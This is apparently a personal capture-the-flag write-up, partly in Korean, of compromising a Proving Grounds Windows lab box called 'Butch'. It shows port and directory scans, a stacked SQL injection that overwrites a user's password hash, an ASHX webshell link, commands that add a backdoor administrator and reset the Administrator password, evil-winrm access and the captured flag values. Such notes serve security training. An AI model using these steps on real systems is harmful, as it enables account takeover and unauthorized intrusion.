---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/lfi-rfi
  - tech/web/file-upload
  - tech/exec/winrm
  - tech/enum/dirbust
type: machine
platform: pg
os: windows
ip: 192.168.243.63
ports: [21, 25, 135, 139, 445, 450, 5985]
services: [ftp, http, microsoft-ds, msrpc, netbios-ssn, smtp]
status: solved
tech_count: 4
---
### Nmap
```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ nnmap 192.168.243.63
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 10:48 +0900
Nmap scan report for 192.168.243.63
Host is up (0.086s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
| smtp-commands: butch Hello [192.168.45.207], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
450/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Butch
| http-methods:
|_  Potentially risky methods: TRACE
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-18T01:50:03
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   85.78 ms 192.168.45.1
2   85.63 ms 192.168.45.254
3   86.38 ms 192.168.251.1
4   87.36 ms 192.168.243.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.69 seconds
```


### whatweb
```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ cat whatweb.txt
http://192.168.243.63:450 [200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.243.63], Meta-Author[Butch], Microsoft-IIS[10.0], PasswordField[ctl00$ContentPlaceHolder1$PasswordTextBox], Title[Butch][Title element contains newline(s)!], X-Powered-By[ASP.NET]
```


### feroxbuster
```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ feroxbuster -u http://192.168.243.63:450/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.243.63:450/
 🚩  In-Scope Url          │ 192.168.243.63
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [asp, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       60w     4209c http://192.168.243.63:450/favicon.png
200      GET       82l      138w     1191c http://192.168.243.63:450/style.css
200      GET       42l      128w     2128c http://192.168.243.63:450/
301      GET        2l       10w      153c http://192.168.243.63:450/dev => http://192.168.243.63:450/dev/
301      GET        2l       10w      153c http://192.168.243.63:450/DEV => http://192.168.243.63:450/DEV/
301      GET        2l       10w      153c http://192.168.243.63:450/Dev => http://192.168.243.63:450/Dev/
404      GET       40l      156w     1888c http://192.168.243.63:450/con
404      GET       40l      156w     1888c http://192.168.243.63:450/aux
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.asp
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.txt
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.html
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.bak
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.zip
404      GET       40l      156w     1888c http://192.168.243.63:450/prn
[####################] - 3m    180156/180156  0s      found:15      errors:0
[####################] - 3m    180000/180000  1100/s  http://192.168.243.63:450/
[####################] - 0s    180000/180000  1034483/s http://192.168.243.63:450/dev/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    180000/180000  1034483/s http://192.168.243.63:450/DEV/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    180000/180000  1052632/s http://192.168.243.63:450/Dev/ => Directory listing (add --scan-dir-listings to scan)     
```

/dev 
![[Pasted image 20260818110442.png]]

site.master.txt 
```html
<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
	<head runat="server">
		<title>Butch</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="application-name" content="Butch">
		<meta name="author" content="Butch">
		<meta name="description" content="Butch">
		<meta name="keywords" content="Butch">
		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
	</head>
	<body>
		<div id="wrap">
			<div id="header">Welcome to Butch Repository</div>
			<div id="main">
				<div id="content">
					<br />
					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
					<br />
				</div>
			</div>
		</div>
	</body>
</html>
```

id 입력창에 작은따음표 입력 ' 시 에러 발생
![[Pasted image 20260818110543.png]]

SQLi 실행
```sql
'; update users set password_hash='48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0' where username = 'butch'; --
```

![[Pasted image 20260818111108.png]]

https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx

웹쉘 사용

![[Pasted image 20260818111445.png]]

웹쉘 사용
![[Pasted image 20260818111513.png]]


net user /add 4leaf Password1  
net localgroup administrators 4leaf /add  
net localgroup "Remote Management Users" 4leaf /add

![[Pasted image 20260818111626.png]]

evil-winrm 접근 
```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ evil-winrm -i 192.168.243.63 -u '4leaf' -p 'Password1'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```


adminstrator 패스워드 변경 후 flag 확인
```ps
net user administrator Password1
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/17/2026   6:48 PM             34 proof.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type proof.txt
18c3403c59645f8a20b213fe2b1768ef

*Evil-WinRM* PS C:\Users\Administrator\desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> cd butch
*Evil-WinRM* PS C:\Users\butch> cd desktop
*Evil-WinRM* PS C:\Users\butch\desktop> type local.txt
0c5dba72fd1984addf833413a2f9c58e

```

